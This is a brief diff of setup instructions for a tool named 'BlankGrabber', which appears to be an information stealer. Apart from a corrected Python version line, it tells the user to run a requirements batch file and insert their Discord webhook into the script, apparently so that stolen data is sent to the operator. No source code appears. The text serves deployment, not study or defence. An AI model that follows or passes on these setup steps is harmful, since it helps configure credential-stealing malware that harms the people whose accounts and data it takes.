@@ -1,4 +1,4 @@
-nMake sure you have python installed and have an active internet connection.
+Make sure you have Python 3.7+ installed and have an active internet connection.
 
 (1) Run the "Requirements.bat" file and let the installation complete.
 (2) Place your discord webhook in the "BlankGrabber.py" file and save it
